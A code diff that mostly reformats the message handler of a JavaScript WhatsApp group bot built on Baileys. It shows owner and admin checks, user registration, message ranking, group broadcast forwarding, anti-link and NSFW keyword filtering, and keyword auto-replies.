-        if (!tasks.length) {
-            const newTaskList = [newTask];
-            const insertQuery = `INSERT INTO \`tasks\` (user_id, tasks) VALUES (?, ?)`;
-            await db.promise().query(insertQuery, [user_id, JSON.stringify(newTaskList)]);
-            return 'New task added successfully';
-        } else {
-            let taskList = JSON.parse(tasks[0].tasks);
-            taskList.push(newTask);
-            const updatedTasks = JSON.stringify(taskList);
-            const updateQuery = `UPDATE \`tasks\` SET tasks = ? WHERE user_id = ?`;
-            await db.promise().query(updateQuery, [updatedTasks, user_id]);
-            return 'New task added successfully';
-        }
-    } catch (err) {
-        return `Error adding new task: ${err}`
+  try {
+    const tasks = await getTasks(user_id);
+    if (!tasks.length) {
+      const newTaskList = [newTask];
+      const insertQuery = `INSERT INTO \`tasks\` (user_id, tasks) VALUES (?, ?)`;
+      await db
+        .promise()
+        .query(insertQuery, [user_id, JSON.stringify(newTaskList)]);
+      return "New task added successfully";
+    } else {
+      const taskList = JSON.parse(tasks[0].tasks);
+      taskList.push(newTask);
+      const updatedTasks = JSON.stringify(taskList);
+      const updateQuery = `UPDATE \`tasks\` SET tasks = ? WHERE user_id = ?`;
+      await db.promise().query(updateQuery, [updatedTasks, user_id]);
+      return "New task added successfully";
     }
+  } catch (err) {
+    return `Error adding new task: ${err}`;
+  }
 }
 
-async function handleMessage(AlexaInc, {
-    messages,
-    type
-}, loadMessage, saveMessage, p, getnMessagesFrom, getMessagePosition, loadMessagesBetween) {
-    try {
-        const msg = messages[0];
+async function handleMessage(
+  AlexaInc,
+  { messages, type },
+  loadMessage,
+  saveMessage,
+  p,
+  getnMessagesFrom,
+  getMessagePosition,
+  loadMessagesBetween,
+) {
+  try {
+    const msg = messages[0];
 
-        const mess = {
-            owner: async () => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: 'You are not the owner baby'
-            }, {
-                quoted: msg
-            }),
-            admin: async () => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: 'You are not a admin baby'
-            }, {
-                quoted: msg
-            }),
-            "admin&owner": async () => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: 'You are not admin or owner baby'
-            }, {
-                quoted: msg
-            }),
-            group: async () => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: 'This is private chat baby thin command only for groups'
-            }, {
-                quoted: msg
-            }),
-            botadmin: async () => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: 'Please make me admin baby'
-            }, {
-                quoted: msg
-            }),
-            private: async () => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: 'lets talk about it privately baby'
-            }, {
-                quoted: msg
-            }),
-            reply: async (text) => await AlexaInc.sendMessage(msg.key.remoteJid, {
-                text: text
-            }, {
-                quoted: msg
-            }),
-        };
+    const mess = {
+      owner: async () =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: "You are not the owner baby",
+          },
+          {
+            quoted: msg,
+          },
+        ),
+      admin: async () =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: "You are not a admin baby",
+          },
+          {
+            quoted: msg,
+          },
+        ),
+      "admin&owner": async () =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: "You are not admin or owner baby",
+          },
+          {
+            quoted: msg,
+          },
+        ),
+      group: async () =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: "This is private chat baby thin command only for groups",
+          },
+          {
+            quoted: msg,
+          },
+        ),
+      botadmin: async () =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: "Please make me admin baby",
+          },
+          {
+            quoted: msg,
+          },
+        ),
+      private: async () =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: "lets talk about it privately baby",
+          },
+          {
+            quoted: msg,
+          },
+        ),
+      reply: async (text) =>
+        await AlexaInc.sendMessage(
+          msg.key.remoteJid,
+          {
+            text: text,
+          },
+          {
+            quoted: msg,
+          },
+        ),
+    };
 
+    // console.log(msg)
 
+    let sender = msg.key.remoteJid;
+    let senderabfff = msg.key.remoteJid;
+    const senderdef = msg.key.remoteJid;
+    if (sender.endsWith("@g.us") || sender.endsWith("@broadcast")) {
+      senderabfff = msg.participant || msg.key.participant;
+      sender = `${msg.participant || msg.key.participant}@${senderdef}`; // Assign participant ID instead
+    }
 
-        // console.log(msg)
+    // Every owner/special list accepts comma-separated values, e.g.
+    // Owner_nb="94766045156,94723966801". Normalise the configured
+    // identities exactly once so direct messages, group participants and
+    // device-suffixed JIDs are compared consistently.
+    const configuredValues = (value) =>
+      String(value || "")
+        .split(",")
+        .map((entry) => entry.trim())
+        .filter(Boolean);
+    const phoneJids = (value) =>
+      configuredValues(value).map((number) => {
+        const cleaned = number.replace(/[^\d@.]/g, "");
+        return cleaned.includes("@")
+          ? cleaned
+          : `${cleaned.replace(/\D/g, "")}@s.whatsapp.net`;
+      });
+    const lidJids = (value) =>
+      configuredValues(value).map((id) =>
+        id.includes("@") ? id : `${id}@lid`,
+      );
 
-        let sender = msg.key.remoteJid;
-        let senderabfff = msg.key.remoteJid;
-        const senderdef = msg.key.remoteJid;
-        if (sender.endsWith('@g.us') || sender.endsWith('@broadcast')) {
-            senderabfff = msg.participant || msg.key.participant;
-            sender = `${msg.participant || msg.key.participant}@${senderdef}`; // Assign participant ID instead
-        }
+    const ownerJIDs = phoneJids(process.env.Owner_nb);
+    const ownerLIDs = lidJids(process.env.Owner_id);
+    const allOwners = [...ownerJIDs, ...ownerLIDs];
+    const isOwner = groupDirectory.sameIdentity(senderabfff, allOwners);
+    const specialJids = phoneJids(process.env.spc_nb);
+    const isspc = groupDirectory.sameIdentity(senderabfff, specialJids);
+    const isGroup = msg.key.remoteJid.endsWith("@g.us");
+    const groupMetadata = isGroup
+      ? await getCachedGroupMetadata(AlexaInc, msg.key.remoteJid)
+      : null;
+    const participants = isGroup ? groupMetadata?.participants || [] : [];
+    const groupname = groupMetadata?.subject || null;
+    const groupAdmins = participants.filter(groupDirectory.isAdmin);
+    // Match every Baileys identifier (id/jid/lid/phoneNumber), not only an
+    // optional `participant.jid` property. This works after reconnect when
+    // WhatsApp returns a different representation for the same account.
+    const senderIdentity = [
+      senderabfff,
+      msg.key.participant,
+      msg.key.participantAlt,
+    ];
+    const isAdmins = isGroup
+      ? isOwner ||
+        groupAdmins.some((admin) =>
+          groupDirectory.sameIdentity(
+            senderIdentity,
+            groupDirectory.participantIds(admin),
+          ),
+        )
+      : false;
+    const groupOwner = isGroup ? groupMetadata?.owner || "" : "";
+    const isBotallowed = await isBotAllowed(msg.key.remoteJid);
+    const isBotorFakeWeb = isBotOrFakeWeb(msg);
+    const ottffsse = msg.participant || msg.key.participant;
+    const botJid = jidNormalizedUser(AlexaInc.user.id);
+    const botNumber = botJid.replace(/@.*/, "");
+    const botLid =
+      groupDirectory.socketIds(AlexaInc).find((id) => id.endsWith("@lid")) ||
+      "";
+    // Admin state is derived from freshly invalidated/refetched metadata,
+    // never persisted as a stale boolean. index.js clears metadata cache on
+    // every promote/demote/add/remove and re-syncs every group on reconnect.
+    const isBotAdmins =
+      isGroup && groupDirectory.isBotAdmin(AlexaInc, groupMetadata);
+    updateUser(msg, participants, groupname);
+    const isReplyToBot =
+      areJidsSameUser(
+        msg.message?.extendedTextMessage?.contextInfo?.participant,
+        botJid,
+      ) ||
+      areJidsSameUser(
+        msg.message?.extendedTextMessage?.contextInfo?.participant,
+        botLid,
+      );
 
+    function formatUptime(uptime) {
+      const seconds = Math.floor(uptime % 60);
+      const minutes = Math.floor(uptime / 60) % 60;
+      const hours = Math.floor(uptime / 3600) % 24;
+      const days = Math.floor(uptime / 86400);
+      return `${days} d, ${hours} h, ${minutes} m, ${seconds} s`;
+    }
 
+    const iduser = isGroup
+      ? participants.find((jsn) => jsn.lid === msg.key.participant)?.id ||
+        msg.key.participant
+      : senderabfff;
 
+    const remoteJid = msg.key.remoteJid;
+    const isDirectMessage = !remoteJid.endsWith("@g.us");
 
-        // Every owner/special list accepts comma-separated values, e.g.
-        // Owner_nb="94766045156,94723966801". Normalise the configured
-        // identities exactly once so direct messages, group participants and
-        // device-suffixed JIDs are compared consistently.
-        const configuredValues = (value) => String(value || "")
-            .split(",")
-            .map((entry) => entry.trim())
-            .filter(Boolean);
-        const phoneJids = (value) => configuredValues(value).map((number) => {
-            const cleaned = number.replace(/[^\d@.]/g, "");
-            return cleaned.includes("@")
-                ? cleaned
-                : `${cleaned.replace(/\D/g, "")}@s.whatsapp.net`;
+    let rawParticipant, rawParticipantAlt, FinalGid;
+
+    if (isDirectMessage) {
+      rawParticipant = remoteJid;
+      rawParticipantAlt = msg.key.remoteJidAlt;
+      FinalGid = null;
+    } else {
+      rawParticipant = msg.key.participant;
+      rawParticipantAlt = msg.key.participantAlt;
+      FinalGid = msg.key.remoteJid;
+    }
+
+    let finalJid = null;
+    let finalLid = null;
+
+    if (rawParticipant?.endsWith("@lid")) {
+      finalLid = rawParticipant;
+      finalJid = rawParticipantAlt;
+    } else if (rawParticipantAlt?.endsWith("@s.whatsapp.net")) {
+      finalJid = rawParticipantAlt;
+      finalLid = rawParticipant;
+    } else {
+      finalJid = rawParticipant;
+      finalLid = rawParticipantAlt;
+    }
+
+    // Register every user as soon as Baileys gives us an LID. This is the
+    // canonical identity shared by the account portal and every game table.
+    // WhatsApp occasionally omits an LID in a new DM; in that case we wait
+    // for its LID mapping instead of creating a fake phone-number username.
+    if (userProfiles.isLid(finalLid)) {
+      try {
+        await userProfiles.ensureAccount({
+          lid: finalLid,
+          whatsappJid: finalJid,
+          displayName: msg.pushName,
         });
-        const lidJids = (value) => configuredValues(value).map((id) =>
-            id.includes("@") ? id : `${id}@lid`,
+      } catch (accountError) {
+        console.error(
+          "[profile] Could not register user account:",
+          accountError.message,
         );
+      }
+    }
 
-        const ownerJIDs = phoneJids(process.env.Owner_nb);
-        const ownerLIDs = lidJids(process.env.Owner_id);
-        const allOwners = [...ownerJIDs, ...ownerLIDs];
-        const isOwner = groupDirectory.sameIdentity(senderabfff, allOwners);
-        const specialJids = phoneJids(process.env.spc_nb);
-        const isspc = groupDirectory.sameIdentity(senderabfff, specialJids);
-        const isGroup = msg.key.remoteJid.endsWith('@g.us');
-        const groupMetadata = isGroup ? await getCachedGroupMetadata(AlexaInc, msg.key.remoteJid) : null;
-        const participants = isGroup ? groupMetadata?.participants || [] : [];
-        const groupname = groupMetadata?.subject || null
-        const groupAdmins = participants.filter(groupDirectory.isAdmin);
-        // Match every Baileys identifier (id/jid/lid/phoneNumber), not only an
-        // optional `participant.jid` property. This works after reconnect when
-        // WhatsApp returns a different representation for the same account.
-        const senderIdentity = [senderabfff, msg.key.participant, msg.key.participantAlt];
-        const isAdmins = isGroup ?
-            isOwner || groupAdmins.some(admin =>
-                groupDirectory.sameIdentity(senderIdentity, groupDirectory.participantIds(admin))) :
-            false;
-        const groupOwner = isGroup ? groupMetadata?.owner || '' : '';
-        const isBotallowed = await isBotAllowed(msg.key.remoteJid);
-        const isBotorFakeWeb = isBotOrFakeWeb(msg);
-        const ottffsse = msg.participant || msg.key.participant
-        const botJid = jidNormalizedUser(AlexaInc.user.id);
-        const botNumber = botJid.replace(/@.*/, "")
-        const botLid = groupDirectory.socketIds(AlexaInc).find(id => id.endsWith('@lid')) || '';
-        // Admin state is derived from freshly invalidated/refetched metadata,
-        // never persisted as a stale boolean. index.js clears metadata cache on
-        // every promote/demote/add/remove and re-syncs every group on reconnect.
-        const isBotAdmins = isGroup && groupDirectory.isBotAdmin(AlexaInc, groupMetadata);
-        updateUser(msg, participants, groupname);
-        const isReplyToBot = areJidsSameUser(msg.message?.extendedTextMessage?.contextInfo?.participant, botJid) || areJidsSameUser(msg.message?.extendedTextMessage?.contextInfo?.participant, botLid);
+    if (finalLid) addXP(finalLid);
 
-
-        function formatUptime(uptime) {
-            const seconds = Math.floor(uptime % 60);
-            const minutes = Math.floor(uptime / 60) % 60;
-            const hours = Math.floor(uptime / 3600) % 24;
-            const days = Math.floor(uptime / 86400);
-            return `${days} d, ${hours} h, ${minutes} m, ${seconds} s`;
-        };
-
-
-        const iduser = isGroup ?
-            (participants.find(jsn => jsn.lid === msg.key.participant)?.id || msg.key.participant) :
-            senderabfff;
-
-        const remoteJid = msg.key.remoteJid;
-        const isDirectMessage = !remoteJid.endsWith('@g.us');
-
-
-
-        let rawParticipant, rawParticipantAlt,FinalGid;
-
-        if (isDirectMessage) {
-            rawParticipant = remoteJid;
-            rawParticipantAlt = msg.key.remoteJidAlt;
-            FinalGid = null;
-        } else {
-            rawParticipant = msg.key.participant;
-            rawParticipantAlt = msg.key.participantAlt;
-            FinalGid = msg.key.remoteJid;
-        }
-
-        let finalJid = null;
-        let finalLid = null;
-
-        if (rawParticipant?.endsWith('@lid')) {
-            finalLid = rawParticipant;
-            finalJid = rawParticipantAlt;
-        } else if (rawParticipantAlt?.endsWith('@s.whatsapp.net')) {
-            finalJid = rawParticipantAlt;
-            finalLid = rawParticipant;
-        } else {
-            finalJid = rawParticipant;
-            finalLid = rawParticipantAlt;
-        }
-
-        // Register every user as soon as Baileys gives us an LID. This is the
-        // canonical identity shared by the account portal and every game table.
-        // WhatsApp occasionally omits an LID in a new DM; in that case we wait
-        // for its LID mapping instead of creating a fake phone-number username.
-        if (userProfiles.isLid(finalLid)) {
-            try {
-                await userProfiles.ensureAccount({
-                    lid: finalLid,
-                    whatsappJid: finalJid,
-                    displayName: msg.pushName,
-                });
-            } catch (accountError) {
-                console.error('[profile] Could not register user account:', accountError.message);
-            }
-        }
-
-        if (finalLid) addXP(finalLid);
-
-
-
-        const uptimepc = await formatUptime(si.uptime());
-        const cpuData = await si.cpus()[0].model;
-        // RAM line: os.totalmem() - os.freemem() counted the kernel's page
-        // cache as "used" and reported ~93% on a box `free -h` called 37% full.
-        // memoryStats reproduces `free`'s arithmetic (and honours a container
-        // limit), so .menu and the control panel now show the same number.
-        const memSnapshot = memoryStats.snapshot({ processes: false });
-        const memTotal = memoryStats.formatBytes(memSnapshot.total);
-        const memUsed = memoryStats.formatBytes(memSnapshot.used);
-        const memPct = Math.round(memSnapshot.usedPercent);
-        const roleuser = isOwner ? 'Owner' : 'User';
-        let menu = `╭━━━━━━━━━━━━━━━━━━━━━━━╮
+    const uptimepc = await formatUptime(si.uptime());
+    const cpuData = await si.cpus()[0].model;
+    // RAM line: os.totalmem() - os.freemem() counted the kernel's page
+    // cache as "used" and reported ~93% on a box `free -h` called 37% full.
+    // memoryStats reproduces `free`'s arithmetic (and honours a container
+    // limit), so .menu and the control panel now show the same number.
+    const memSnapshot = memoryStats.snapshot({ processes: false });
+    const memTotal = memoryStats.formatBytes(memSnapshot.total);
+    const memUsed = memoryStats.formatBytes(memSnapshot.used);
+    const memPct = Math.round(memSnapshot.usedPercent);
+    const roleuser = isOwner ? "Owner" : "User";
+    const menu = `╭━━━━━━━━━━━━━━━━━━━━━━━╮
 ┃                     🎀  𝒜𝐿𝐸𝒳𝒜 - 𝓥3 🎀                       ┃
 ┃━━━━━━━━━━━━━━━━━━━━━━━┃
 ┃
@@ -1364,9 +1472,9 @@ async function handleMessage(AlexaInc, {
 ┃ ✧ ʟɪᴍɪᴛ: *no limit enjoy* 
 ┃ ✧ ʀᴏʟᴇ: *${roleuser}*  
 ┃ ✧ ʟᴇᴠᴇʟ: *${getLevel(senderabfff)}*
-┃ ✧ ᴅᴀʏ: *${moment.tz('Asia/Colombo').format('dddd')}*,  
-┃ ✧ ᴅᴀᴛᴇ: *${moment.tz('Asia/Colombo').format('MMMM Do YYYY')}*  
-┃ ✧ ᴛɪᴍᴇ: *${moment.tz('Asia/Colombo').format('HH:mm:ss')}*
+┃ ✧ ᴅᴀʏ: *${moment.tz("Asia/Colombo").format("dddd")}*,  
+┃ ✧ ᴅᴀᴛᴇ: *${moment.tz("Asia/Colombo").format("MMMM Do YYYY")}*  
+┃ ✧ ᴛɪᴍᴇ: *${moment.tz("Asia/Colombo").format("HH:mm:ss")}*
 ┃
 ┣━━━━━━━━━━━━━━━━━━━━━━━┫
 ┃                       🎀  𝒜𝐿𝐸𝒳𝒜 - 𝓥3 🎀                     ┃
@@ -1375,814 +1483,991 @@ async function handleMessage(AlexaInc, {
 ╰━━━━━━━━━━━━━━━━━━━━━━━╯
 `;
 
+    if (!msg.key.fromMe) {
+      AlexaInc.readMessages([msg.key]);
 
+      let messageText = null;
 
+      messageText =
+        msg.message?.conversation ||
+        msg.message?.extendedTextMessage?.text ||
+        msg.message?.imageMessage?.caption ||
+        msg.message?.buttonsResponseMessage?.selectedButtonId ||
+        msg.message?.videoMessage?.caption ||
+        msg.message?.documentMessage?.caption ||
+        JSON.parse(
+          msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage
+            ?.paramsJson || "{}",
+        ).id ||
+        msg.message?.templateButtonReplyMessage?.selectedId ||
+        null;
 
+      const messageonlyText =
+        msg.message?.conversation || msg.message?.extendedTextMessage?.text;
 
+      const isReply =
+        !!msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
 
+      if (messageText) {
+        const args = messageText.trim().split(/ +/).slice(1);
+        const text = (q = args.join(" "));
+        console.log(
+          chalk.red().bold(msg.pushName) +
+            chalk.yellow().bold(`[${sender}]`) +
+            ": " +
+            chalk.blue().bold(messageText),
+        );
 
+        const firstWord = messageText.trim().split(/\s+/)[0].toLowerCase();
 
+        //// antilink and antinsfw
 
+        const nsfwWords = [
+          "porn",
+          "porno",
+          "pornhub",
+          "xvideos",
+          "xnxx",
+          "xhamster",
+          "redtube",
+          "camgirl",
+          "camwhore",
+          "onlyfans",
+          "nudes",
+          "sex tape",
+          "sex video",
+          "amateur porn",
+          "hardcore",
+          "softcore",
+          "hentai",
+          "ecchi",
+          "doujin",
+          "lewd",
 
+          "masturbate",
+          "masturbation",
+          "blowjob",
+          "handjob",
+          "deepthroat",
+          "anal",
+          "rimjob",
+          "fisting",
+          "cunnilingus",
+          "fellatio",
+          "creampie",
+          "bukkake",
+          "gangbang",
+          "threesome",
+          "orgy",
+          "69",
+          "suck",
+          "spitroast",
+          "double penetration",
+          "dp",
+          "pegging",
+          "strapon",
+          "cumshot",
 
+          "pussy",
+          "dick",
+          "cock",
+          "penis",
+          "vagina",
+          "clit",
+          "boobs",
+          "tits",
+          "nipples",
+          "asshole",
+          "buttplug",
+          "anus",
+          "balls",
+          "scrotum",
 
+          "dildo",
+          "vibrator",
+          "sex toy",
+          "sex toys",
+          "anal beads",
+          "fleshlight",
+          "kink",
+          "fetish",
 
+          "slut",
+          "whore",
+          "hooker",
+          "prostitute",
+          "bimbo",
+          "cumdump",
+          "cumslut",
+          "fucktoy",
+          "cocksucker",
 
+          "rape",
+          "incest",
+          "molest",
+          "child porn",
+          "cp",
+          "loli",
+          "shota",
+          "pedo",
+          "pedophile",
+          "bestiality",
+          "zoophilia",
+          "necrophilia",
+          "snuff",
+          "goreporn",
+          "underage porn",
 
+          "watersports",
+          "pissing",
+          "golden shower",
+          "scat",
+          "shitplay",
+          "vomit fetish",
+          "choking",
+          "bondage",
+          "bdsm",
+          "dominatrix",
+          "submissive",
+          "slave play",
+          "femdom",
+          "cuckold",
+        ];
 
+        ////////chatfight
 
+        if (isGroup && !isBotorFakeWeb) {
+          try {
+            const groupId = msg.key.remoteJid;
+            const senderId = finalLid; // Ensure finalLid is defined in your scope
+            const filePath = `${RANKING_FOLDER}/${groupId}.json`;
 
+            // 1. Load Group into Cache if not present (Lazy Loading)
+            if (!rankingCache[groupId]) {
+              if (fs.existsSync(filePath)) {
+                try {
+                  rankingCache[groupId] = JSON.parse(
+                    fs.readFileSync(filePath, "utf-8"),
+                  );
+                } catch {
+                  rankingCache[groupId] = {}; // Handle corrupt file
+                }
+              } else {
+                rankingCache[groupId] = {};
+              }
+            }
 
+            // 2. Get the database object from RAM
+            const rankDb = rankingCache[groupId];
 
+            // 3. Initialize user if not exists
+            if (!rankDb[senderId]) {
+              rankDb[senderId] = {
+                global: 0,
+                daily: {
+                  count: 0,
+                  dayKey: getDayKey(),
+                },
+                weekly: {
+                  count: 0,
+                  weekKey: getWeekKey(),
+                },
+              };
+            }
 
+            const userStats = rankDb[senderId];
+            const currentDay = getDayKey();
+            const currentWeek = getWeekKey();
 
-        if (!msg.key.fromMe) {
+            // 4. Update GLOBAL count
+            userStats.global = (userStats.global || 0) + 1;
 
-            AlexaInc.readMessages([msg.key]);
+            // 5. Update DAILY count
+            if (userStats.daily?.dayKey !== currentDay) {
+              userStats.daily = {
+                count: 1,
+                dayKey: currentDay,
+              };
+            } else {
+              userStats.daily.count += 1;
+            }
 
-            let messageText = null;
+            // 6. Update WEEKLY count
+            if (userStats.weekly?.weekKey !== currentWeek) {
+              userStats.weekly = {
+                count: 1,
+                weekKey: currentWeek,
+              };
+            } else {
+              userStats.weekly.count += 1;
+            }
 
-            messageText = msg.message?.conversation ||
-                msg.message?.extendedTextMessage?.text ||
-                msg.message?.imageMessage?.caption ||
-                msg.message?.buttonsResponseMessage?.selectedButtonId ||
-                msg.message?.videoMessage?.caption ||
-                msg.message?.documentMessage?.caption ||
-                JSON.parse(
-                    msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}'
-                ).id || msg.message?.templateButtonReplyMessage?.selectedId ||
-                null;
+            // 7. Mark this group as "Dirty" (Needs saving)
+            // The setInterval at the top will pick this up in the next minute
+            groupsToSave.add(groupId);
+          } catch (e) {
+            console.error("Error in Ranking Listener:", e);
+          }
+        }
 
-            const messageonlyText = msg.message?.conversation ||
-                msg.message?.extendedTextMessage?.text
+        if (msg.key.remoteJid == "120363423573824395@newsletter") {
+          const fownerNumber = process.env["Owner_nb"].split(",")[0].trim();
 
-            const isReply = !!msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+          const { setTimeout: wait } = require("timers/promises");
 
+          const groups = await AlexaInc.groupFetchAllParticipating();
+          const groupIds = Object.keys(groups);
 
-            if (messageText) {
-                const args = messageText.trim().split(/ +/).slice(1);
-                const text = q = args.join(" ")
-                console.log(chalk.red().bold(msg.pushName) + chalk.yellow().bold(`[${sender}]`) + ': ' + chalk
-                    .blue().bold(messageText));
+          console.log(
+            `[Broadcast] Starting to send to ${groupIds.length} groups...`,
+          );
 
-                const firstWord = messageText.trim().split(/\s+/)[0].toLowerCase();
+          for (const group of groupIds) {
+            try {
+              await AlexaInc.sendMessage(group, {
+                forward: msg,
+                force: true,
+              });
+              console.log(`[Broadcast] Successfully sent to: ${group}`);
+              await wait(10000);
+            } catch (error) {
+              console.error(
+                `[Broadcast] Failed to send to ${group}:`,
+                error.message,
+              );
+              if (error.data === 429) {
+                console.log(
+                  "Rate limit hit. Waiting 30 seconds before retrying next group...",
+                );
+                await wait(30000); // Wait 30 seconds
+              }
+            }
+          }
+          AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, {
+            text: "[Broadcast] All messages sent!",
+          });
+          console.log("[Broadcast] All messages sent!");
+          return;
+        }
 
+        if (messageText.includes("@admin") && isGroup) {
+          if (!isGroup) mess.group();
+          const idminids = [];
+          await groupAdmins.forEach((admin) => {
+            idminids.push(admin.id);
+          });
+          AlexaInc.sendMessage(
+            msg.key.remoteJid,
+            {
+              text: "reported to admins",
+              mentions: idminids,
+            },
+            {
+              quoted: msg,
+            },
+          );
+        }
 
+        async function checkBadWord(msg, messageText, isYtCommand) {
+          if (isYtCommand) return false;
 
+          if (!isGroup) return false;
 
+          if (!badwordceck.check(messageText)) {
+            return false;
+          }
+          try {
+            const settings = await getCachedGroupSettings(
+              db,
+              msg.key.remoteJid,
+            );
+            if (settings && settings.antinsfw) {
+              return settings.nsfw_a;
+            }
+            return false;
+          } catch (err) {
+            console.error("Error querying the database:", err);
+            return false;
+          }
+        }
 
+        /**
+         * @param {object} msg
+         * @param {string} messageText
+         * @param {boolean} isYtCommand
+         *V @returns {Promise<string|boolean>}
+         */
+        async function checkAntiLink(msg, messageText, isYtCommand) {
+          if (isYtCommand) return false;
 
-                //// antilink and antinsfw
+          if (!isGroup) return false;
 
-                const nsfwWords = [
-                    'porn', 'porno', 'pornhub', 'xvideos', 'xnxx', 'xhamster', 'redtube', 'camgirl', 'camwhore',
-                    'onlyfans', 'nudes', 'sex tape', 'sex video', 'amateur porn', 'hardcore', 'softcore',
-                    'hentai',
-                    'ecchi', 'doujin', 'lewd',
+          const robustUrlRegex =
+            /(https?:\/\/[^\s]+|www\.[^\s]+|([\w-]+\.)+(com|net|org|io|dev|xyz|lk|in|info|biz|me|app))\b/gi;
 
-                    'masturbate', 'masturbation', 'blowjob', 'handjob', 'deepthroat', 'anal', 'rimjob',
-                    'fisting', 'cunnilingus', 'fellatio', 'creampie', 'bukkake', 'gangbang', 'threesome',
-                    'orgy',
-                    '69', 'suck', 'spitroast', 'double penetration', 'dp', 'pegging', 'strapon', 'cumshot',
+          const potentialUrls = messageText.match(robustUrlRegex);
 
-                    'pussy', 'dick', 'cock', 'penis', 'vagina', 'clit', 'boobs', 'tits', 'nipples',
-                    'asshole', 'buttplug', 'anus', 'balls', 'scrotum',
+          if (!potentialUrls) {
+            return false;
+          }
+          try {
+            const settings = await getCachedGroupSettings(
+              db,
+              msg.key.remoteJid,
+            );
+            if (settings && settings.antilink) {
+              return settings.link_a;
+            }
+            return false;
+          } catch (err) {
+            console.error("Error querying the database:", err);
+            return false; // Always return false if a DB error occurs
+          }
+        }
 
-                    'dildo', 'vibrator', 'sex toy', 'sex toys', 'anal beads', 'fleshlight', 'kink', 'fetish',
+        // const greetingRegex = /\b(hi|hello)\b/i;
 
-                    'slut', 'whore', 'hooker', 'prostitute', 'bimbo', 'cumdump', 'cumslut', 'fucktoy',
-                    'cocksucker',
+        // if (greetingRegex.test(messageText)) {
 
-                    'rape', 'incest', 'molest', 'child porn', 'cp', 'loli', 'shota', 'pedo', 'pedophile',
-                    'bestiality', 'zoophilia', 'necrophilia', 'snuff', 'goreporn', 'underage porn',
+        //     try {
 
-                    'watersports', 'pissing', 'golden shower', 'scat', 'shitplay', 'vomit fetish', 'choking',
-                    'bondage', 'bdsm', 'dominatrix', 'submissive', 'slave play', 'femdom', 'cuckold'
-                ];
+        //         const audioBuffer = fs.readFileSync('./assets/audio/welcome.ogg');
 
-                ////////chatfight
+        //         await AlexaInc.sendMessage(msg.key.remoteJid, {
+        //             audio: audioBuffer,
+        //             mimetype: 'audio/mpeg',
+        //             ptt: true
+        //         }, {
+        //             quoted: msg
+        //         });
 
-                if (isGroup && !isBotorFakeWeb) {
-                    try {
-                        const groupId = msg.key.remoteJid;
-                        const senderId = finalLid; // Ensure finalLid is defined in your scope
-                        const filePath = `${RANKING_FOLDER}/${groupId}.json`;
+        //     } catch (error) {
 
-                        // 1. Load Group into Cache if not present (Lazy Loading)
-                        if (!rankingCache[groupId]) {
-                            if (fs.existsSync(filePath)) {
-                                try {
-                                    rankingCache[groupId] = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
-                                } catch {
-                                    rankingCache[groupId] = {}; // Handle corrupt file
-                                }
-                            } else {
-                                rankingCache[groupId] = {};
-                            }
-                        }
+        //         console.error("Error sending welcome audio:", error);
+        //     }
+        // }
 
-                        // 2. Get the database object from RAM
-                        const rankDb = rankingCache[groupId];
+        const matchedFilter = await Filters.checkFilters(
+          msg.key.remoteJid,
+          messageText,
+        );
+        // console.log(matchedFilter)
 
-                        // 3. Initialize user if not exists
-                        if (!rankDb[senderId]) {
-                            rankDb[senderId] = {
-                                global: 0,
-                                daily: {
-                                    count: 0,
-                                    dayKey: getDayKey()
-                                },
-                                weekly: {
-                                    count: 0,
-                                    weekKey: getWeekKey()
-                                }
-                            };
-                        }
+        // console.log(isBotallowed,isBotorFakeWeb)
+        // console.log(isGroup , !isBotallowed , isBotorFakeWeb , !isAdmins , isBotAdmins)
+        if (
+          isGroup &&
+          !isBotallowed &&
+          isBotorFakeWeb &&
+          !isAdmins &&
+          isBotAdmins &&
+          !isspc &&
+          !isOwner
+        ) {
+          console.log("kik", msg.key.participant);
+          await AlexaInc.sendMessage(msg.key.remoteJid, {
+            text: "bots not allowed here",
+          });
+          await AlexaInc.groupParticipantsUpdate(
+            msg.key.remoteJid,
+            [msg.key.participant],
+            "remove",
+          );
+        }
 
-                        const userStats = rankDb[senderId];
-                        const currentDay = getDayKey();
-                        const currentWeek = getWeekKey();
+        if (matchedFilter && !messageText.startsWith("/stop" || "/filter")) {
+          if (matchedFilter.type === "text") {
+            let reptxt = matchedFilter.reply;
 
-                        // 4. Update GLOBAL count
-                        userStats.global = (userStats.global || 0) + 1;
+            reptxt = reptxt
+              .replace(/\{name\}|<name>/gi, msg.pushName || "")
+              .replace(
+                /\{gname\}|<gname>|\{group name\}|<group name>/gi,
+                groupname || "",
+              )
+              .replace(
+                /\{time\}/gi,
+                moment.tz("Asia/Colombo").format("HH:mm:ss"),
+              )
+              .replace(
+                /\{date\}/gi,
+                moment.tz("Asia/Colombo").format("MMMM Do YYYY"),
+              )
+              .replace(/\{day\}/gi, moment.tz("Asia/Colombo").format("dddd"))
+              .replace(/\{greating\}/, getGreeting());
 
-                        // 5. Update DAILY count
-                        if (userStats.daily?.dayKey !== currentDay) {
-                            userStats.daily = {
-                                count: 1,
-                                dayKey: currentDay
-                            };
-                        } else {
-                            userStats.daily.count += 1;
-                        }
+            AlexaInc.sendMessage(
+              msg.key.remoteJid,
+              {
+                text: reptxt,
+              },
+              {
+                quoted: msg,
+              },
+            );
+          } else if (matchedFilter.type === "sticker") {
+            const buffer = Buffer.from(matchedFilter.reply, "base64");
+            AlexaInc.sendMessage(
+              msg.key.remoteJid,
+              {
+                sticker: buffer,
+                mimetype: matchedFilter.mimetype,
+              },
+              {
+                quoted: msg,
+              },
+            );
